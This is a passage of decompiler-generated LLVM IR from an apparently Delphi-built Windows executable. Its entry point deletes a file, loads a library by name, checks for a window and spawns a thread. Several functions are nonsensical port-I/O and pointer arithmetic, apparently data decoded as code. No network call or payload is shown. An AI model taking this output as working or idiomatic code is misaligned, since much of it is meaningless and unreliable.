dec_label_pc_407a10:
  %merge.reg2mem = alloca i32, !insn.addr !2128
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %5 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %6 = call i32 @__decompiler_undefined_function_0()
  %7 = call i1 @__decompiler_undefined_function_1()
  %8 = call i1 @__decompiler_undefined_function_1()
  %9 = call i32 @__decompiler_undefined_function_0()
  %10 = icmp eq i1 %7, false, !insn.addr !2128
  br i1 %10, label %dec_label_pc_407a3f, label %dec_label_pc_407a12, !insn.addr !2128

dec_label_pc_407a12:                              ; preds = %dec_label_pc_407a10
  br i1 %8, label %dec_label_pc_407a48, label %dec_label_pc_407a15, !insn.addr !2129

dec_label_pc_407a15:                              ; preds = %dec_label_pc_407a12
  %11 = trunc i32 %4 to i16, !insn.addr !2130
  %12 = call i8 @__asm_insb(i16 %11), !insn.addr !2130
  %13 = inttoptr i32 %0 to i8*, !insn.addr !2130
  store i8 %12, i8* %13, align 1, !insn.addr !2130
  %14 = call i8 @__asm_insb(i16 %11), !insn.addr !2131
  store i8 %14, i8* %13, align 1, !insn.addr !2131
  %15 = bitcast i32* %eax to i8*
  %16 = load i8, i8* %15, align 4, !insn.addr !2132
  %17 = load i32, i32* %eax, align 4
  %18 = trunc i32 %17 to i8, !insn.addr !2132
  %19 = add i8 %16, %18, !insn.addr !2132
  %20 = inttoptr i32 %17 to i8*, !insn.addr !2132
  store i8 %19, i8* %20, align 1, !insn.addr !2132
  call void @__asm_outsd(i16 %11, i32 %1), !insn.addr !2133
  %21 = trunc i32 %arg10 to i16, !insn.addr !2134
  %22 = call i32 @__asm_insd(i16 %21), !insn.addr !2134
  %23 = inttoptr i32 %9 to i32*, !insn.addr !2134
  store i32 %22, i32* %23, align 4, !insn.addr !2134
  store i32 %arg1, i32* %eax, align 4, !insn.addr !2135
  %24 = inttoptr i32 %arg1 to i8*, !insn.addr !2136
  %25 = load i8, i8* %24, align 1, !insn.addr !2136
  %26 = trunc i32 %arg1 to i8, !insn.addr !2136
  %27 = add i8 %25, %26, !insn.addr !2136
  store i8 %27, i8* %24, align 1, !insn.addr !2136
  %28 = trunc i32 %arg3 to i16, !insn.addr !2137
  %29 = inttoptr i32 %arg6 to i32*, !insn.addr !2137
  %30 = load i32, i32* %29, align 4, !insn.addr !2137
  call void @__asm_outsd(i16 %28, i32 %30), !insn.addr !2137
  %31 = add i32 %arg5, 67, !insn.addr !2138
  %32 = and i32 %31, 65535
  %33 = inttoptr i32 %32 to i32*, !insn.addr !2138
  %34 = load i32, i32* %33, align 4, !insn.addr !2138
  %35 = load i8, i8* %24, align 1, !insn.addr !2139
  %36 = add i8 %35, %26, !insn.addr !2139
  store i8 %36, i8* %24, align 1, !insn.addr !2139
  %37 = mul i32 %34, 1557718248, !insn.addr !2140
  %38 = add i32 %arg7, 97, !insn.addr !2140
  %39 = add i32 %38, %37, !insn.addr !2140
  %40 = inttoptr i32 %39 to i8*, !insn.addr !2140
  %41 = load i8, i8* %40, align 1, !insn.addr !2140
  %42 = trunc i32 %arg2 to i8
  %43 = add i8 %42, 1, !insn.addr !2140
  %44 = add i8 %43, %41, !insn.addr !2140
  %45 = icmp eq i8 %44, 0, !insn.addr !2140
  store i8 %44, i8* %40, align 1, !insn.addr !2140
  %46 = load i32, i32* %eax, align 4
  store i32 %46, i32* %merge.reg2mem, !insn.addr !2141
  br i1 %45, label %dec_label_pc_407ab1, label %dec_label_pc_407a3f, !insn.addr !2141

dec_label_pc_407a3f:                              ; preds = %dec_label_pc_407a10, %dec_label_pc_407a15
  %merge.reload = load i32, i32* %merge.reg2mem
  ret i32 %merge.reload, !insn.addr !2142

dec_label_pc_407a48:                              ; preds = %dec_label_pc_407a12
  %47 = trunc i32 %6 to i8
  %48 = mul i8 %47, 2, !insn.addr !2143
  %49 = inttoptr i32 %6 to i8*, !insn.addr !2143
  store i8 %48, i8* %49, align 1, !insn.addr !2143
  %50 = add i32 %3, 104, !insn.addr !2144
  %51 = inttoptr i32 %50 to i8*, !insn.addr !2144
  %52 = load i8, i8* %51, align 1, !insn.addr !2144
  %53 = udiv i32 %4, 256, !insn.addr !2144
  %54 = trunc i32 %53 to i8, !insn.addr !2144
  %55 = add i8 %52, %54, !insn.addr !2144
  store i8 %55, i8* %51, align 1, !insn.addr !2144
  %56 = trunc i32 %4 to i16, !insn.addr !2145
  %57 = call i8 @__asm_insb(i16 %56), !insn.addr !2145
  %58 = inttoptr i32 %0 to i8*, !insn.addr !2145
  store i8 %57, i8* %58, align 1, !insn.addr !2145
  %59 = call i8 @__asm_insb(i16 %56), !insn.addr !2146
  store i8 %59, i8* %58, align 1, !insn.addr !2146
  %60 = call i8 @__asm_insb(i16 %56), !insn.addr !2147
  store i8 %60, i8* %58, align 1, !insn.addr !2147
  %61 = call i8 @__asm_insb(i16 %56), !insn.addr !2148
  store i8 %61, i8* %58, align 1, !insn.addr !2148
  %62 = load i8, i8* %51, align 1, !insn.addr !2149
  %63 = trunc i32 %4 to i8, !insn.addr !2149
  %64 = add i8 %62, %63, !insn.addr !2149
  store i8 %64, i8* %51, align 1, !insn.addr !2149
  %65 = call i8 @__asm_insb(i16 %56), !insn.addr !2150
  store i8 %65, i8* %58, align 1, !insn.addr !2150
  %66 = call i8 @__asm_insb(i16 %56), !insn.addr !2151
  store i8 %66, i8* %58, align 1, !insn.addr !2151
  %67 = add i32 %2, 1, !insn.addr !2152
  %68 = icmp slt i32 %67, 0, !insn.addr !2152
  br i1 %68, label %dec_label_pc_407ac9, label %dec_label_pc_407a64, !insn.addr !2153

dec_label_pc_407a64:                              ; preds = %dec_label_pc_407a48
  %69 = mul i32 %1, 256
  %70 = and i32 %69, 65280
  %71 = xor i32 %5, %70, !insn.addr !2154
  %72 = xor i32 %4, %1, !insn.addr !2155
  %73 = bitcast i32* %eax to i8*
  %74 = add i32 %2, 117, !insn.addr !2156
  %75 = inttoptr i32 %74 to i16*, !insn.addr !2156
  %76 = load i16, i16* %75, align 2, !insn.addr !2156
  %77 = trunc i32 %72 to i16, !insn.addr !2156
  call void @__asm_arpl(i16 %76, i16 %77), !insn.addr !2156
  %78 = load i8, i8* %73, align 4, !insn.addr !2157
  %79 = load i32, i32* %eax, align 4
  %80 = trunc i32 %79 to i8, !insn.addr !2157
  %81 = add i8 %78, %80, !insn.addr !2157
  %82 = inttoptr i32 %79 to i8*, !insn.addr !2157
  store i8 %81, i8* %82, align 1, !insn.addr !2157
  %83 = add i32 %71, 82, !insn.addr !2158
  %84 = inttoptr i32 %83 to i8*, !insn.addr !2158
  %85 = load i8, i8* %84, align 1, !insn.addr !2158
  %86 = add i8 %85, %63, !insn.addr !2158
  store i8 %86, i8* %84, align 1, !insn.addr !2158
  %87 = load i32, i32* %eax, align 4, !insn.addr !2159
  %88 = add i32 %87, -1, !insn.addr !2159
  %89 = add i32 %71, 4231437, !insn.addr !2160
  %90 = inttoptr i32 %89 to i8*, !insn.addr !2160
  %91 = load i8, i8* %90, align 1, !insn.addr !2160
  %92 = udiv i32 %88, 256, !insn.addr !2160
  %93 = trunc i32 %92 to i8, !insn.addr !2160
  %94 = add i8 %91, %93, !insn.addr !2160
  store i8 %94, i8* %90, align 1, !insn.addr !2160
  ret i32 %88, !insn.addr !2160

dec_label_pc_407ab1:                              ; preds = %dec_label_pc_407a15
  %95 = add i32 %46, 1, !insn.addr !2161
  store i32 %95, i32* %eax, align 4, !insn.addr !2161
  %96 = inttoptr i32 %arg4 to i8*, !insn.addr !2162
  %97 = load i8, i8* %96, align 1, !insn.addr !2162
  %98 = udiv i32 %arg3, 256, !insn.addr !2162
  %99 = trunc i32 %98 to i8, !insn.addr !2162
  %100 = add i8 %97, %99, !insn.addr !2162
  store i8 %100, i8* %96, align 1, !insn.addr !2162
  %101 = add i32 %arg3, 89, !insn.addr !2163
  %102 = inttoptr i32 %101 to i8*, !insn.addr !2163
  store i8 -1, i8* %102, align 1, !insn.addr !2163
  call void @__writefsdword(i32 %95, i32 %arg3), !insn.addr !2164
  %103 = load i32, i32* %eax, align 4, !insn.addr !2165
  ret i32 %103, !insn.addr !2165

dec_label_pc_407ac9:                              ; preds = %dec_label_pc_407a48
  %104 = load i32, i32* %eax, align 4, !insn.addr !2166
  ret i32 %104, !insn.addr !2166
}

define i32 @function_407acc() local_unnamed_addr {
dec_label_pc_407acc:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_40a6f4, align 4, !insn.addr !2167
  %2 = add i32 %1, -1, !insn.addr !2167
  store i32 %2, i32* @global_var_40a6f4, align 4, !insn.addr !2167
  ret i32 %0, !insn.addr !2168
}

define i32 @function_407ad4() local_unnamed_addr {
dec_label_pc_407ad4:
  %0 = call i32 @"@LStrAsg"(), !insn.addr !2169
  ret i32 %0, !insn.addr !2170
}

define i32 @function_407aeb(i32 %arg1) local_unnamed_addr {
dec_label_pc_407aeb:
  %.reg2mem = alloca i32, !insn.addr !2171
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_-22 = alloca i32, align 4
  %4 = add i32 %2, -1, !insn.addr !2171
  %5 = inttoptr i32 %2 to i32*, !insn.addr !2171
  store i32 %4, i32* %5, align 4, !insn.addr !2171
  %6 = bitcast i32* %eax to i8*
  %7 = load i8, i8* %6, align 4, !insn.addr !2172
  %8 = load i32, i32* %eax, align 4
  %9 = trunc i32 %8 to i8, !insn.addr !2172
  %10 = add i8 %7, %9, !insn.addr !2172
  %11 = icmp ult i8 %10, %7, !insn.addr !2172
  %12 = inttoptr i32 %8 to i8*, !insn.addr !2172
  store i8 %10, i8* %12, align 1, !insn.addr !2172
  %13 = icmp eq i1 %11, false, !insn.addr !2173
  br i1 %13, label %dec_label_pc_407b5d, label %dec_label_pc_407af2, !insn.addr !2173

dec_label_pc_407af2:                              ; preds = %dec_label_pc_407aeb
  %14 = add i32 %1, 110, !insn.addr !2174
  %15 = inttoptr i32 %14 to i32*, !insn.addr !2174
  %16 = load i32, i32* %15, align 4, !insn.addr !2174
  %17 = sext i32 %16 to i64, !insn.addr !2174
  %18 = mul nsw i64 %17, 100, !insn.addr !2174
  %19 = mul i64 %17, 429496729600
  %20 = sdiv i64 %19, 4294967296, !insn.addr !2174
  %21 = icmp ne i64 %18, %20, !insn.addr !2174
  %22 = icmp eq i1 %21, false, !insn.addr !2175
  br i1 %22, label %dec_label_pc_407b71, label %dec_label_pc_407b03, !insn.addr !2175

dec_label_pc_407b03:                              ; preds = %dec_label_pc_407af2
  %23 = trunc i64 %18 to i32, !insn.addr !2174
  %24 = add i32 %23, 100, !insn.addr !2176
  %25 = call i32 @__readfsdword(i32 %24), !insn.addr !2176
  %26 = sext i32 %25 to i64, !insn.addr !2176
  %27 = mul nsw i64 %26, 104, !insn.addr !2176
  %28 = mul i64 %26, 446676598784
  %29 = sdiv i64 %28, 4294967296, !insn.addr !2176
  %30 = icmp ne i64 %27, %29, !insn.addr !2176
  %31 = icmp eq i1 %30, false, !insn.addr !2177
  br i1 %31, label %dec_label_pc_407b70, label %dec_label_pc_407b0a, !insn.addr !2177

dec_label_pc_407b0a:                              ; preds = %dec_label_pc_407b03
  %32 = trunc i64 %27 to i32, !insn.addr !2176
  %33 = add i32 %32, -4, !insn.addr !2178
  %34 = inttoptr i32 %33 to i32*, !insn.addr !2178
  store i32 1936221811, i32* %34, align 4, !insn.addr !2178
  %35 = add i32 %32, -6, !insn.addr !2179
  %36 = inttoptr i32 %35 to i16*, !insn.addr !2179
  store i16 26470, i16* %36, align 2, !insn.addr !2179
  %37 = add i32 %32, -10, !insn.addr !2180
  %38 = inttoptr i32 %37 to i32*, !insn.addr !2180
  store i32 1935763050, i32* %38, align 4, !insn.addr !2180
  %39 = trunc i32 %2 to i16, !insn.addr !2181
  %40 = call i8 @__asm_insb(i16 %39), !insn.addr !2181
  %41 = inttoptr i32 %0 to i8*, !insn.addr !2181
  store i8 %40, i8* %41, align 1, !insn.addr !2181
  %42 = add i32 %3, 106, !insn.addr !2182
  %43 = inttoptr i32 %42 to i32*, !insn.addr !2182
  %44 = load i32, i32* %43, align 4, !insn.addr !2182
  %45 = mul i32 %44, 115, !insn.addr !2182
  %46 = add i32 %2, 97, !insn.addr !2183
  %47 = call i32 @__readfsdword(i32 %46), !insn.addr !2183
  %48 = sext i32 %47 to i64, !insn.addr !2183
  %49 = mul nsw i64 %48, 108, !insn.addr !2183
  %50 = mul i64 %48, 463856467968
  %51 = sdiv i64 %50, 4294967296, !insn.addr !2183
  %52 = icmp ne i64 %49, %51, !insn.addr !2183
  %53 = icmp eq i1 %52, false, !insn.addr !2184
  br i1 %53, label %dec_label_pc_407b91, label %dec_label_pc_407b26, !insn.addr !2184

dec_label_pc_407b26:                              ; preds = %dec_label_pc_407b0a
  %54 = add i32 %45, -4, !insn.addr !2185
  %55 = inttoptr i32 %54 to i32*, !insn.addr !2185
  store i32 97, i32* %55, align 4, !insn.addr !2185
  %56 = call i8 @__asm_insb(i16 %39), !insn.addr !2186
  store i8 %56, i8* %41, align 1, !insn.addr !2186
  %57 = add i32 %45, -8, !insn.addr !2187
  %58 = inttoptr i32 %57 to i32*, !insn.addr !2187
  store i32 97, i32* %58, align 4, !insn.addr !2187
  %59 = add i32 %45, 12, !insn.addr !2188
  %60 = add i32 %45, 20, !insn.addr !2188
  %61 = inttoptr i32 %45 to i32*, !insn.addr !2188
  %62 = load i32, i32* %61, align 4, !insn.addr !2188
  %63 = inttoptr i32 %59 to i32*, !insn.addr !2188
  %64 = load i32, i32* %63, align 4, !insn.addr !2188
  %65 = inttoptr i32 %60 to i32*, !insn.addr !2188
  %66 = load i32, i32* %65, align 4, !insn.addr !2188
  %67 = trunc i32 %64 to i16, !insn.addr !2189
  %68 = call i8 @__asm_insb(i16 %67), !insn.addr !2189
  store i8 %68, i8* inttoptr (i32 97 to i8*), align 1, !insn.addr !2189
  %69 = inttoptr i32 %66 to i8*, !insn.addr !2190
  %70 = load i8, i8* %69, align 1, !insn.addr !2190
  %71 = trunc i32 %66 to i8, !insn.addr !2190
  %72 = add i8 %70, %71, !insn.addr !2190
  store i8 %72, i8* %69, align 1, !insn.addr !2190
  store i32 %62, i32* %65, align 4, !insn.addr !2191
  %73 = add i32 %45, 16, !insn.addr !2192
  %74 = inttoptr i32 %73 to i32*, !insn.addr !2192
  store i32 %60, i32* %74, align 4, !insn.addr !2192
  store i32 4225889, i32* %63, align 4, !insn.addr !2193
  %75 = call i32 @__readfsdword(i32 0), !insn.addr !2194
  %76 = add i32 %45, 8, !insn.addr !2194
  %77 = inttoptr i32 %76 to i32*, !insn.addr !2194
  store i32 %75, i32* %77, align 4, !insn.addr !2194
  call void @__writefsdword(i32 0, i32 %76), !insn.addr !2195
  %78 = load i32, i32* @global_var_40a6f8, align 4, !insn.addr !2196
  %79 = add i32 %78, 1, !insn.addr !2196
  store i32 %79, i32* @global_var_40a6f8, align 4, !insn.addr !2196
  %80 = load i32, i32* %77, align 4, !insn.addr !2197
  call void @__writefsdword(i32 0, i32 %80), !insn.addr !2198
  ret i32 0, !insn.addr !2198

dec_label_pc_407b5d:                              ; preds = %dec_label_pc_407aeb
  %81 = call i8 @llvm.ctpop.i8(i8 %10), !range !564, !insn.addr !2172
  %82 = and i8 %81, 1, !insn.addr !2172
  %83 = icmp eq i8 %82, 0, !insn.addr !2172
  %84 = icmp eq i1 %83, false, !insn.addr !2199
  br i1 %84, label %dec_label_pc_407b5d.dec_label_pc_407b9f_crit_edge, label %dec_label_pc_407b5f, !insn.addr !2199

dec_label_pc_407b5d.dec_label_pc_407b9f_crit_edge: ; preds = %dec_label_pc_407b5d
  %.pre = load i32, i32* %eax, align 4
  store i32 %.pre, i32* %.reg2mem
  br label %dec_label_pc_407b9f

dec_label_pc_407b5f:                              ; preds = %dec_label_pc_407b5d
  %85 = call i32 @"@HandleFinally"(), !insn.addr !2200
  ret i32 %85, !insn.addr !2200

dec_label_pc_407b70:                              ; preds = %dec_label_pc_407b03
  %86 = load i32, i32* %eax, align 4, !insn.addr !2201
  ret i32 %86, !insn.addr !2201

dec_label_pc_407b71:                              ; preds = %dec_label_pc_407af2
  %87 = call i32 @__readfsdword(i32 0), !insn.addr !2202
  store i32 %87, i32* %stack_var_-22, align 4, !insn.addr !2202
  %88 = ptrtoint i32* %stack_var_-22 to i32, !insn.addr !2202
  call void @__writefsdword(i32 0, i32 %88), !insn.addr !2203
  %89 = load i32, i32* @global_var_40a6f8, align 4, !insn.addr !2204
  %90 = add i32 %89, -1, !insn.addr !2204
  %91 = icmp eq i32 %89, 0, !insn.addr !2204
  store i32 %90, i32* @global_var_40a6f8, align 4, !insn.addr !2204
  %92 = icmp eq i1 %91, false, !insn.addr !2205
  br i1 %92, label %dec_label_pc_407b9d, label %dec_label_pc_407b88, !insn.addr !2205

dec_label_pc_407b88:                              ; preds = %dec_label_pc_407b71
  %93 = call i32 @function_407ad4(), !insn.addr !2206
  ret i32 %93, !insn.addr !2206

dec_label_pc_407b91:                              ; preds = %dec_label_pc_407b0a
  %94 = trunc i64 %49 to i32, !insn.addr !2183
  %95 = add i32 %45, -4, !insn.addr !2207
  %96 = inttoptr i32 %95 to i32*, !insn.addr !2207
  store i32 %94, i32* %96, align 4, !insn.addr !2207
  %97 = load i32, i32* %eax, align 4, !insn.addr !2208
  ret i32 %97, !insn.addr !2208

dec_label_pc_407b9d:                              ; preds = %dec_label_pc_407b71
  store i32 0, i32* %eax, align 4, !insn.addr !2209
  store i32 0, i32* %.reg2mem, !insn.addr !2209
  br label %dec_label_pc_407b9f, !insn.addr !2209

dec_label_pc_407b9f:                              ; preds = %dec_label_pc_407b5d.dec_label_pc_407b9f_crit_edge, %dec_label_pc_407b9d
  %.reload = load i32, i32* %.reg2mem, !insn.addr !2210
  %98 = load i32, i32* %stack_var_-22, align 4, !insn.addr !2211
  call void @__writefsdword(i32 %.reload, i32 %98), !insn.addr !2210
  %99 = call i32 @"@LStrClr"(), !insn.addr !2212
  ret i32 %99, !insn.addr !2213
}

define i32 @function_407bb3() local_unnamed_addr {
dec_label_pc_407bb3:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !2214
  ret i32 %0, !insn.addr !2214
}

define i32 @function_407bb8() local_unnamed_addr {
dec_label_pc_407bb8:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2215
}

define i32 @function_407bba(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_407bba:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2216
}

define i32 @function_407bc0() local_unnamed_addr {
dec_label_pc_407bc0:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2217
}

define i32 @SetFieldText.50() local_unnamed_addr {
dec_label_pc_407beb:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !2218
  ret i32 %0, !insn.addr !2218
}

define i32 @function_407bf0() local_unnamed_addr {
dec_label_pc_407bf0:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2219
}

define i32 @function_407bf2(i32 %arg1) local_unnamed_addr {
dec_label_pc_407bf2:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2220
}

define i32 @entry_point() local_unnamed_addr {
dec_label_pc_407cf4:
  %esp.2.reg2mem = alloca i32, !insn.addr !2221
  %esp.1.reg2mem = alloca i32, !insn.addr !2221
  %esp.0.reg2mem = alloca i32, !insn.addr !2221
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-136 = alloca i8*, align 4
  %stack_var_-128 = alloca i32, align 4
  %stack_var_-116 = alloca i32, align 4
  %1 = call i32 @"@InitLib"(i32 %0), !insn.addr !2222
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !2223
  store i32 %2, i32* %stack_var_-116, align 4, !insn.addr !2223
  %3 = ptrtoint i32* %stack_var_-116 to i32, !insn.addr !2223
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !2224
  store i32 0, i32* %stack_var_-128, align 4, !insn.addr !2225
  %4 = call i32 @GetModuleFileNameA(i32* inttoptr (i32 260 to i32*), i8* bitcast (i8** @global_var_40a700 to i8*), i32 0), !insn.addr !2226
  %5 = add i32 %4, ptrtoint (i8** @global_var_40a700 to i32), !insn.addr !2227
  %6 = inttoptr i32 %5 to i8*, !insn.addr !2227
  store i8 0, i8* %6, align 1, !insn.addr !2227
  %7 = call i32 @"@LStrAsg"(), !insn.addr !2228
  %8 = call i32 @"@LStrFromArray"(), !insn.addr !2229
  %9 = call i32 @function_40708c(), !insn.addr !2230
  %10 = call i32 @"@LStrAsg"(), !insn.addr !2231
  %11 = call i32 @function_407104(), !insn.addr !2232
  %12 = trunc i32 %11 to i8, !insn.addr !2233
  %13 = icmp eq i8 %12, 0, !insn.addr !2233
  br i1 %13, label %dec_label_pc_407e0b, label %dec_label_pc_407d90, !insn.addr !2234

dec_label_pc_407d90:                              ; preds = %dec_label_pc_407cf4
  %14 = load i32, i32* @global_var_40912c, align 4, !insn.addr !2235
  %15 = inttoptr i32 %14 to i32*, !insn.addr !2236
  store i32 -1, i32* %15, align 4, !insn.addr !2236
  %16 = call i32 @"@LStrFromArray"(), !insn.addr !2237
  %17 = call i32 @function_4070cc(), !insn.addr !2238
  %18 = call i32 @"@LStrAsg"(), !insn.addr !2239
  %19 = call i32 @"@LStrCat3"(), !insn.addr !2240
  %20 = call i32 @function_4036c8(), !insn.addr !2241
  %21 = inttoptr i32 %20 to i8*, !insn.addr !2242
  %22 = call i1 @DeleteFileA(i8* %21), !insn.addr !2243
  %23 = call i32 @"@LStrCat3"(), !insn.addr !2244
  %24 = call i32 @function_4036c8(), !insn.addr !2245
  %25 = inttoptr i32 %24 to i8*, !insn.addr !2246
  store i8* %25, i8** %stack_var_-136, align 4, !insn.addr !2246
  %26 = ptrtoint i8** %stack_var_-136 to i32, !insn.addr !2246
  %27 = call i32* @LoadLibraryA(i8* %25), !insn.addr !2247
  %28 = ptrtoint i32* %27 to i32, !insn.addr !2247
  store i32 %28, i32* @global_var_409118, align 4, !insn.addr !2248
  store i32 %26, i32* %esp.0.reg2mem, !insn.addr !2249
  br label %dec_label_pc_407e38, !insn.addr !2249

dec_label_pc_407e0b:                              ; preds = %dec_label_pc_407cf4
  %29 = ptrtoint i32* %stack_var_-128 to i32, !insn.addr !2225
  %30 = call i32 @function_4060f0(), !insn.addr !2250
  %31 = call i32 @function_407104(), !insn.addr !2251
  %32 = trunc i32 %31 to i8, !insn.addr !2252
  %33 = icmp eq i8 %32, 0, !insn.addr !2252
  store i32 %29, i32* %esp.2.reg2mem, !insn.addr !2253
  br i1 %33, label %dec_label_pc_407f7a, label %dec_label_pc_407e2d, !insn.addr !2253

dec_label_pc_407e2d:                              ; preds = %dec_label_pc_407e0b
  %34 = load i32, i32* @global_var_409138, align 4, !insn.addr !2254
  %35 = inttoptr i32 %34 to i32*, !insn.addr !2255
  store i32 -1, i32* %35, align 4, !insn.addr !2255
  store i32 %29, i32* %esp.0.reg2mem, !insn.addr !2255
  br label %dec_label_pc_407e38, !insn.addr !2255

dec_label_pc_407e38:                              ; preds = %dec_label_pc_407e2d, %dec_label_pc_407d90
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %36 = add i32 %esp.0.reload, -4, !insn.addr !2256
  %37 = inttoptr i32 %36 to i32*, !insn.addr !2256
  store i32 260, i32* %37, align 4, !insn.addr !2256
  %38 = add i32 %esp.0.reload, -8, !insn.addr !2257
  %39 = inttoptr i32 %38 to i32*, !insn.addr !2257
  store i32 ptrtoint (i8** @global_var_40a700 to i32), i32* %39, align 4, !insn.addr !2257
  %40 = load i32 (i32, i32, i32)*, i32 (i32, i32, i32)** @global_var_40a650, align 4, !insn.addr !2258
  %41 = ptrtoint i32 (i32, i32, i32)* %40 to i32, !insn.addr !2258
  %42 = add i32 %esp.0.reload, -12, !insn.addr !2259
  %43 = inttoptr i32 %42 to i32*, !insn.addr !2259
  store i32 %41, i32* %43, align 4, !insn.addr !2259
  %44 = call i32 @GetModuleFileNameA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !2260
  %45 = add i32 %44, ptrtoint (i8** @global_var_40a700 to i32), !insn.addr !2261
  %46 = inttoptr i32 %45 to i8*, !insn.addr !2261
  store i8 0, i8* %46, align 1, !insn.addr !2261
  %47 = call i32 @"@LStrFromArray"(), !insn.addr !2262
  %48 = call i32 @function_4070cc(), !insn.addr !2263
  %49 = call i32 @"@LStrAsg"(), !insn.addr !2264
  %50 = call i32 @"@LStrCat3"(), !insn.addr !2265
  %51 = load i32, i32* @global_var_409138, align 4, !insn.addr !2266
  %52 = icmp eq i32 %51, 0, !insn.addr !2266
  br i1 %52, label %dec_label_pc_407ed1, label %dec_label_pc_407e9e, !insn.addr !2267

dec_label_pc_407e9e:                              ; preds = %dec_label_pc_407e38
  %53 = add i32 %esp.0.reload, -16, !insn.addr !2268
  %54 = inttoptr i32 %53 to i32*, !insn.addr !2268
  store i32 ptrtoint ([16 x i8]* @global_var_407ffc to i32), i32* %54, align 4, !insn.addr !2268
  %55 = add i32 %esp.0.reload, -20, !insn.addr !2269
  %56 = inttoptr i32 %55 to i32*, !insn.addr !2269
  store i32 ptrtoint ([8 x i8]* @global_var_40800c to i32), i32* %56, align 4, !insn.addr !2269
  %57 = call i32* @FindWindowA(i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*)), !insn.addr !2270
  %58 = icmp eq i32* %57, null, !insn.addr !2271
  %59 = icmp eq i1 %58, false, !insn.addr !2272
  store i32 %55, i32* %esp.2.reg2mem, !insn.addr !2272
  br i1 %59, label %dec_label_pc_407f7a, label %dec_label_pc_407eb5, !insn.addr !2272

dec_label_pc_407eb5:                              ; preds = %dec_label_pc_407e9e
  %60 = add i32 %esp.0.reload, -24, !insn.addr !2273
  %61 = inttoptr i32 %60 to i32*, !insn.addr !2273
  store i32 ptrtoint (i32* @global_var_40a818 to i32), i32* %61, align 4, !insn.addr !2273
  %62 = add i32 %esp.0.reload, -28, !insn.addr !2274
  %63 = inttoptr i32 %62 to i32*, !insn.addr !2274
  store i32 0, i32* %63, align 4, !insn.addr !2274
  %64 = add i32 %esp.0.reload, -32, !insn.addr !2275
  %65 = inttoptr i32 %64 to i32*, !insn.addr !2275
  store i32 66, i32* %65, align 4, !insn.addr !2275
  %66 = add i32 %esp.0.reload, -36, !insn.addr !2276
  %67 = inttoptr i32 %66 to i32*, !insn.addr !2276
  store i32 4220780, i32* %67, align 4, !insn.addr !2276
  %68 = add i32 %esp.0.reload, -40, !insn.addr !2277
  %69 = inttoptr i32 %68 to i32*, !insn.addr !2277
  store i32 0, i32* %69, align 4, !insn.addr !2277
  %70 = add i32 %esp.0.reload, -44, !insn.addr !2278
  %71 = inttoptr i32 %70 to i32*, !insn.addr !2278
  store i32 0, i32* %71, align 4, !insn.addr !2278
  %72 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* bitcast (i32* @0 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @0 to i32), i32 (i32*)* bitcast (i32* @0 to i32 (i32*)*), i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !2279
  store i32 %70, i32* %esp.2.reg2mem, !insn.addr !2280
  br label %dec_label_pc_407f7a, !insn.addr !2280

dec_label_pc_407ed1:                              ; preds = %dec_label_pc_407e38
  %73 = load i32, i32* @global_var_40912c, align 4, !insn.addr !2281
  %74 = icmp eq i32 %73, 0, !insn.addr !2281
  store i32 %42, i32* %esp.2.reg2mem, !insn.addr !2282
  br i1 %74, label %dec_label_pc_407f7a, label %dec_label_pc_407edf, !insn.addr !2282

dec_label_pc_407edf:                              ; preds = %dec_label_pc_407ed1
  %75 = load i8, i8* bitcast (i32** @global_var_409160 to i8*), align 4, !insn.addr !2283
  %76 = icmp eq i8 %75, 0, !insn.addr !2283
  br i1 %76, label %dec_label_pc_407eee, label %dec_label_pc_407ee9, !insn.addr !2284

dec_label_pc_407ee9:                              ; preds = %dec_label_pc_407edf
  %77 = call i32 @function_40692c(), !insn.addr !2285
  br label %dec_label_pc_407eee, !insn.addr !2285

dec_label_pc_407eee:                              ; preds = %dec_label_pc_407ee9, %dec_label_pc_407edf
  %78 = load i32, i32* @global_var_409148, align 4, !insn.addr !2286
  %79 = icmp slt i32 %78, 1, !insn.addr !2287
  br i1 %79, label %dec_label_pc_407f2b, label %dec_label_pc_407ef8, !insn.addr !2287

dec_label_pc_407ef8:                              ; preds = %dec_label_pc_407eee
  %80 = call i32 @function_404d38(), !insn.addr !2288
  %81 = call i32 @"@LStrCmp"(), !insn.addr !2289
  %82 = load i32, i32* @global_var_409154, align 4, !insn.addr !2290
  %83 = inttoptr i32 %82 to i32*, !insn.addr !2291
  store i32 -1, i32* %83, align 4, !insn.addr !2291
  %84 = load i32, i32* @global_var_409154, align 4, !insn.addr !2292
  %85 = icmp eq i32 %84, 0, !insn.addr !2292
  br i1 %85, label %dec_label_pc_407f2b, label %dec_label_pc_407f26, !insn.addr !2293

dec_label_pc_407f26:                              ; preds = %dec_label_pc_407ef8
  %86 = call i32 @function_40600c(), !insn.addr !2294
  br label %dec_label_pc_407f2b, !insn.addr !2294

